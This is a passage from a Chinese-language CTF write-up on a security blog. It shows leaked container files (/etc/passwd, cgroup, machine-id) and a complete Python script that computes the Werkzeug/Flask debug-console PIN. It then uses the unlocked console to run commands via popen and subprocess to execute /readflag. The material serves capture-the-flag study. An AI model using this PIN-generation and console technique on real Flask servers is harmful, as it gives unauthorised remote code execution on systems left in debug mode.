+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">02:42:ac:1c:00:03,1cc402dd0e11d5ae18db04a6de87223d,12:hugetlb:/docker/9fc232ff6eb31840f1c802ac880957794adb649d4392613b9fe26822a566b6ad,11:cpuset:/docker/9fc232ff6eb31840f1c802ac880957794adb649d4392613b9fe26822a566b6ad,10:rdma:/,9:devices:/docker/9fc232ff6eb31840f1c802ac880957794adb649d4392613b9fe26822a566b6ad,8:blkio:/docker/9fc232ff6eb31840f1c802ac880957794adb649d4392613b9fe26822a566b6ad,7:freezer:/docker/9fc232ff6eb31840f1c802ac880957794adb649d4392613b9fe26822a566b6ad,6:perf_event:/docker/9fc232ff6eb31840f1c802ac880957794adb649d4392613b9fe26822a566b6ad,5:cpu,cpuacct:/docker/9fc232ff6eb31840f1c802ac880957794adb649d4392613b9fe26822a566b6ad,4:pids:/docker/9fc232ff6eb31840f1c802ac880957794adb649d4392613b9fe26822a566b6ad,3:memory:/docker/9fc232ff6eb31840f1c802ac880957794adb649d4392613b9fe26822a566b6ad,2:net_cls,net_prio:/docker/9fc232ff6eb31840f1c802ac880957794adb649d4392613b9fe26822a566b6ad,1:name=systemd:/docker/9fc232ff6eb31840f1c802ac880957794adb649d4392613b9fe26822a566b6ad,0::/system.slice/containerd.servic</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash,daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin,bin:x:2:2:bin:/bin:/usr/sbin/nologin,sys:x:3:3:sys:/dev:/usr/sbin/nologin,sync:x:4:65534:sync:/bin:/bin/sync,games:x:5:60:games:/usr/games:/usr/sbin/nologin,man:x:6:12:man:/var/cache/man:/usr/sbin/nologin,lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin,mail:x:8:8:mail:/var/mail:/usr/sbin/nologin,news:x:9:9:news:/var/spool/news:/usr/sbin/nologin,uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin,proxy:x:13:13:proxy:/bin:/usr/sbin/nologin,www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin,backup:x:34:34:backup:/var/backups:/usr/sbin/nologin,list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin,irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin,gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin,nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin,_apt:x:100:65534::/nonexistent:/usr/sbin/nologin,ctf:x:1000:1000::/home/ctf:/bin/sh</span><br></pre></td></tr></table></figure>
+<p>mac地址：2485378547715</p>
+<p>02:42:ac:1c:00:03 转换10进制</p>
+<p><img src="http://cdn.anyiblog.top/common/1650420474440-31a69cbd-2314-4ded-80ea-06eb8f53ca41.jpg"><br>&#x2F;etc&#x2F;machine-id：1cc402dd0e11d5ae18db04a6de87223d</p>
+<p>&#x2F;proc&#x2F;self&#x2F;cgroup：取 &#x2F;docker&#x2F;字符串后面的内容 即9fc232ff6eb31840f1c802ac880957794adb649d4392613b9fe26822a566b6ad</p>
+<p>docker-id &#x3D; &#x2F;etc&#x2F;machine-id+&#x2F;proc&#x2F;self&#x2F;cgroup &#x3D; 1cc402dd0e11d5ae18db04a6de87223d9fc232ff6eb31840f1c802ac880957794adb649d4392613b9fe26822a566b6ad</p>
+<p>username：ctf</p>
+<p>（可能是靶机的原因 mac地址和docker-id几分钟之后就会刷新 所以pin码可能会失效 多试试就行。）</p>
+<p>代入脚本跑：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#sha1</span><br><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">def pin(username,mac,dockerid):</span><br><span class="line">    probably_public_bits = [</span><br><span class="line">    username,# /etc/passwd</span><br><span class="line">    &#x27;flask.app&#x27;,# 默认值</span><br><span class="line">    &#x27;Flask&#x27;,# 默认值</span><br><span class="line">    &#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27; # 报错得到</span><br><span class="line">]</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    private_bits = [</span><br><span class="line">        mac,#  /sys/class/net/eth0/address 16进制转10进制</span><br><span class="line">        dockerid#  /etc/machine-id+/proc/self/cgroup</span><br><span class="line">    ]</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    h = hashlib.sha1()</span><br><span class="line">    for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">        if not bit:</span><br><span class="line">            continue</span><br><span class="line">        if isinstance(bit, str):</span><br><span class="line">            bit = bit.encode(&#x27;utf-8&#x27;)</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(b&#x27;cookiesalt&#x27;)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    num = None</span><br><span class="line">    if num is None:</span><br><span class="line">        h.update(b&#x27;pinsalt&#x27;)</span><br><span class="line">        num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    rv =None</span><br><span class="line">    if rv is None:</span><br><span class="line">        for group_size in 5, 4, 3:</span><br><span class="line">            if len(num) % group_size == 0:</span><br><span class="line">                rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;)</span><br><span class="line">                            for x in range(0, len(num), group_size))</span><br><span class="line">                break</span><br><span class="line">        else:</span><br><span class="line">            rv = num</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    return rv</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    username = &quot;ctf&quot;</span><br><span class="line">    mac = &quot;02:42:ac:1c:00:03&quot;</span><br><span class="line">    machine = &quot;1cc402dd0e11d5ae18db04a6de87223d&quot;</span><br><span class="line">    cgroup = &quot;9fc232ff6eb31840f1c802ac880957794adb649d4392613b9fe26822a566b6ad&quot;</span><br><span class="line">    dockerid = machine + cgroup</span><br><span class="line">    mac = str(int(mac.replace(&#x27;:&#x27;,&#x27;&#x27;),16))</span><br><span class="line">    pin = pin(username,mac,dockerid)</span><br><span class="line">    print(&#x27;[+] Pin: %s&#x27;%pin)</span><br></pre></td></tr></table></figure>
+<p>684-041-847</p>
+<p>报错后点击：</p>
+<p><img src="http://cdn.anyiblog.top/common/1650420475384-192615b1-ecac-4866-b1e7-c035cf7ec832.jpg"><br>输入：</p>
+<p><img src="http://cdn.anyiblog.top/common/1650420475998-c0f775b6-91eb-46c7-bbd5-4ff69197c634.jpg"><br>Python shell：（或访问&#x2F;console）</p>
+<p><img src="http://cdn.anyiblog.top/common/1650420476805-f16667f5-0573-4066-ae32-d1671e87f62d.jpg">  </p>
+<p>这里用os.system执行命令是无效的：</p>
+<p><img src="http://cdn.anyiblog.top/common/1650420477415-3ff83972-1795-4cab-bbf1-b071e09ee798.jpg"><br>可以用popen来执行：</p>
+<p><img src="http://cdn.anyiblog.top/common/1650420478528-962a2285-2f23-42d5-a3f9-d5a69160b497.jpg"><br>FLAG是一个可执行文件</p>
+<p><img src="http://cdn.anyiblog.top/common/1650420479093-8d75e746-b202-401b-975a-f73d42ee0d6e.jpg"><br>所以我们直接执行一下&#x2F;readflag即可：</p>
+<p><img src="http://cdn.anyiblog.top/common/1650420479746-78484bb4-d81f-47a1-899b-6a9a91021913.jpg"><br>或</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import subprocess</span><br><span class="line">os.system(&#x27;ls /&#x27;)</span><br><span class="line">#readflag FLAG是一个可执行文件</span><br><span class="line">result = subprocess.getstatusoutput(&#x27;/readflag&#x27;)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
+<p><img src="http://cdn.anyiblog.top/common/1650420480452-8ecbb68a-a6aa-4654-a3ae-0e743550464d.jpg"><br>FLAG:*ctf{exploit_Update_with_Version}</p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1726330">https://cloud.tencent.com/developer/article/1726330</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46081055/article/details/120167680">https://blog.csdn.net/weixin_46081055&#x2F;article&#x2F;details&#x2F;120167680</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Anyyy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://www.anyiblog.top/2022/04/20/20220420/">http://www.anyiblog.top/2022/04/20/20220420/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://www.anyiblog.top" target="_blank">Anyyy安全小站</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%88%B7%E9%A2%98/">刷题</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="http://cdn.anyiblog.top/common/1650422131077-48517457-7d0e-40e4-ae4f-4810291233d6.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://fastly.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/06/07/20220607/"><img class="prev-cover" src="http://cdn.anyiblog.top/common/1654606321691-8f89ef23-9c53-4270-b1e2-6f85b792d34b.jpg" onerror="onerror=null;src='http://cdn.anyiblog.top/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">CTF pwn 中最通俗易懂的堆入坑指南</div></div></a></div><div class="next-post pull-right"><a href="/2022/04/06/20220406/"><img class="next-cover" src="http://cdn.anyiblog.top/common/1648472771780-54273b50-04fb-45e1-af57-c724185a2a3b.png" onerror="onerror=null;src='http://cdn.anyiblog.top/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">国赛十套例卷B模块总汇分析</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/10/14/20211014/" title="记一次文件上传之过滤php绕过"><img class="cover" src="http://cdn.anyiblog.top/common/1646392513625-fd6edaab-3c57-4c79-a544-7de27fa9d2ac.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-14</div><div class="title">记一次文件上传之过滤php绕过</div></div></a></div><div><a href="/2021/12/04/20211204/" title="摸鱼大闯关 1-40关 writeup"><img class="cover" src="http://cdn.anyiblog.top/common/1646392613793-f9da8870-2a98-448e-b729-eaed11bfcd2a.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-04</div><div class="title">摸鱼大闯关 1-40关 writeup</div></div></a></div><div><a href="/2021/12/08/20211208/" title="融贯杯 writeup"><img class="cover" src="http://cdn.anyiblog.top/common/1646392643413-f46fa0e1-6d44-4bd9-aa1f-bae80409d3f8.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-08</div><div class="title">融贯杯 writeup</div></div></a></div><div><a href="/2022/03/05/20220305/" title="Bugku S2收官赛AWD解析&如何打AWD?"><img class="cover" src="http://cdn.anyiblog.top/common/1646483574333-968635ed-5a8c-425a-bb24-5552a5e97fa5.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-05</div><div class="title">Bugku S2收官赛AWD解析&如何打AWD?</div></div></a></div><div><a href="/2022/01/09/20220109/" title="2022长安战"疫"WriteUp"><img class="cover" src="http://cdn.anyiblog.top/common/1646392676713-e6fe8060-5ed5-47d6-b53d-7a7ac2e19530.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-09</div><div class="title">2022长安战"疫"WriteUp</div></div></a></div><div><a href="/2022/08/03/20220803/" title="Bugku渗透测试1 writeup超详细"><img class="cover" src="http://cdn.anyiblog.top/common/1659459424138-e8a16af9-c8de-4061-ab93-0113a09f5b1e.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-03</div><div class="title">Bugku渗透测试1 writeup超详细</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="http://cdn.anyiblog.top/img/avatar.jpg" onerror="this.onerror=null;this.src='http://cdn.anyiblog.top/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Anyyy</div><div class="author-info__description">电影落幕，月亮隐没，我会忘记你。</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">36</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">21</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/120264656/"><i class="fab fa-bilibili"></i><span>Bilibili</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=1395980247&amp;website=www.oicqzone.com" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="http://cdn.anyiblog.top/img/wechat.jpg" target="_blank" title="Wechat"><i class="fab fa-weixin"></i></a><a class="social-icon" href="mailto:anyiguys@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">☁️欢迎造访安逸的网安小站☁️<br>⭐不定期更新干货，建议收藏 以防走丢~⭐<br><span style='color: #f66e64'>👉图片无法加载请参考文章 <style>.inform{color: #49B1F5} .inform:hover{color: #99a9bf}</style><a class='inform' href='https://www.anyiblog.top/inform/'>站点通知</a></span></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/08/18/20240818/" title="eBSploit 永恒之蓝一键利用工具"><img src="https://cdn.anyiblog.top/product/ebsploit/cover/header.png" onerror="this.onerror=null;this.src='http://cdn.anyiblog.top/img/404.jpg'" alt="eBSploit 永恒之蓝一键利用工具"/></a><div class="content"><a class="title" href="/2024/08/18/20240818/" title="eBSploit 永恒之蓝一键利用工具">eBSploit 永恒之蓝一键利用工具</a><time datetime="2024-08-17T16:00:00.000Z" title="发表于 2024-08-18 00:00:00">2024-08-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/01/20240601/" title="案例分享 | 记一次对大型国企Ruoyi系统曲折的打点测试But lucky~"><img src="http://cdn.anyiblog.top/WriteUp/20240601/cover.png" onerror="this.onerror=null;this.src='http://cdn.anyiblog.top/img/404.jpg'" alt="案例分享 | 记一次对大型国企Ruoyi系统曲折的打点测试But lucky~"/></a><div class="content"><a class="title" href="/2024/06/01/20240601/" title="案例分享 | 记一次对大型国企Ruoyi系统曲折的打点测试But lucky~">案例分享 | 记一次对大型国企Ruoyi系统曲折的打点测试But lucky~</a><time datetime="2024-05-31T16:00:00.000Z" title="发表于 2024-06-01 00:00:00">2024-06-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/14/20240314/" title="中职网络安全赛项-B模块综合详细题解"><img src="http://cdn.anyiblog.top/WriteUp/20240314/cover.png" onerror="this.onerror=null;this.src='http://cdn.anyiblog.top/img/404.jpg'" alt="中职网络安全赛项-B模块综合详细题解"/></a><div class="content"><a class="title" href="/2024/03/14/20240314/" title="中职网络安全赛项-B模块综合详细题解">中职网络安全赛项-B模块综合详细题解</a><time datetime="2024-03-13T16:00:00.000Z" title="发表于 2024-03-14 00:00:00">2024-03-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/09/20231209/" title="第六届强网拟态国际精英挑战赛线下 白盒资格赛 Misc方向Write Up"><img src="http://cdn.anyiblog.top/WriteUp/20231209/cover.png" onerror="this.onerror=null;this.src='http://cdn.anyiblog.top/img/404.jpg'" alt="第六届强网拟态国际精英挑战赛线下 白盒资格赛 Misc方向Write Up"/></a><div class="content"><a class="title" href="/2023/12/09/20231209/" title="第六届强网拟态国际精英挑战赛线下 白盒资格赛 Misc方向Write Up">第六届强网拟态国际精英挑战赛线下 白盒资格赛 Misc方向Write Up</a><time datetime="2023-12-08T16:00:00.000Z" title="发表于 2023-12-09 00:00:00">2023-12-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/11/20230611/" title="SYCTF2023 安洵杯全国精英赛 | Misc方向题解"><img src="http://cdn.anyiblog.top//common/202306110947345.png" onerror="this.onerror=null;this.src='http://cdn.anyiblog.top/img/404.jpg'" alt="SYCTF2023 安洵杯全国精英赛 | Misc方向题解"/></a><div class="content"><a class="title" href="/2023/06/11/20230611/" title="SYCTF2023 安洵杯全国精英赛 | Misc方向题解">SYCTF2023 安洵杯全国精英赛 | Misc方向题解</a><time datetime="2023-06-11T00:38:26.360Z" title="发表于 2023-06-11 08:38:26">2023-06-11</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2024 By Anyyy</div><div class="icp"><a href="https://beian.miit.gov.cn/" target="_blank"><img class="lozad" style="padding:0px;vertical-align: text-bottom;" src="http://cdn.anyiblog.top/img/beian.png"/><span>浙ICP备2023010983号</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">本地搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://fastly.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="https://fastly.jsdelivr.net/npm/instant.page@5/instantpage.min.js" type="module"></script><script src="https://fastly.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'B9OoMs6vkuGJUaeS3FjECON0-gzGzoHsz',
+      appKey: '03bqTybh2h4Jbp0s5XTucplR',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://fastly.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script src="https://fastly.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/hideMobileSidebar.js"></script><script src="https://fastly.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/hideCategory.min.js"></script><script>window.$crisp = [];
+window.CRISP_WEBSITE_ID = "4b34540b-3bd0-4089-9d4a-3760c14a4207";
+(function () {
+  d = document;
+  s = d.createElement("script");
+  s.src = "https://client.crisp.chat/l.js";
+  s.async = 1;
+  d.getElementsByTagName("head")[0].appendChild(s);
+})();
+$crisp.push(["safe", true])
+
+if (true) {
+  $crisp.push(["do", "chat:hide"])
+  $crisp.push(["on", "chat:closed", function() {
+    $crisp.push(["do", "chat:hide"])
+  }])
+  var chatBtnFn = () => {
+    var chatBtn = document.getElementById("chat_btn")
+    chatBtn.addEventListener("click", function(){
+      $crisp.push(["do", "chat:show"])
+      $crisp.push(["do", "chat:open"])
+
+    });
+  }
+  chatBtnFn()
+} else {
+  if (false) {
+    function chatBtnHide () {
+      $crisp.push(["do", "chat:hide"])
+    }
+    function chatBtnShow () {
+      $crisp.push(["do", "chat:show"])
+    }
+  }
+}</script><script src="https://fastly.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"]):not([href="/music"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax], .pjax-reload script').forEach(*item* *=>* {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
